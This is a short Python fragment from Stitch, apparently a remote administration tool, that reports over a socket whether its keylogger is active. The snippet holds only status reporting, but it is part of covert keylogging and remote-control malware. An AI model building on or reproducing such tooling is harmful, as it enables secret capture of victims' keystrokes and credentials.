# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_status()
if status:
    resp = '[+] Keylogger is active\n'
else:
    resp = '[+] Keylogger is inactive\n'

send(client_socket,resp)
